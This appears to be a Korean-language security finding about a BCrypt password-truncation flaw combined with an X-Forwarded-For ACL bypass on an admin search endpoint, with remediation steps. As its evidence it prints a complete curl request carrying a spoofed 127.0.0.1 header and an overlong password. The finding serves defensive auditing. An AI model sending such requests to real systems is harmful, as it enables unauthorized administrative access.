## Spring Security BCrypt Truncation & ACL Bypass Detection
- **End-Point**: `http://10.64.154.209/cgi-bin/test.cgi/admin/search`
- **영향**: BCrypt 비밀번호 절단 취약점 및 IP 변조를 통한 관리자 권한 탈취 및 비인가 데이터 접근 가능성
- **설명**: BCrypt의 72바이트 제한을 이용한 비밀번호 절단 취약점(CVE-2025-22228)과 X-Forwarded-For 헤더를 악용한 ACL 우회를 통해 관리자 검색 엔드포인트 접근을 시도함
- **근거**: `curl -X 'POST' -d '{"apiKey": "test", "password": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB"}' -H 'Content-Type: application/json' -H 'Host: 10.64.154.209' -H 'User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' -H 'X-Forwarded-For: 127.0.0.1' 'http://10.64.154.209/cgi-bin/test.cgi/admin/search'`
- **대응**: Spring Security를 최신 패치 버전으로 업데이트하고 비밀번호 입력 길이를 적절한 수준으로 제한함
- **조치**: X-Forwarded-For 헤더에 기반한 접근 제어 설정을 재검토하고 신뢰할 수 있는 프록시 환경에서만 해당 헤더를 수용하도록 구성함
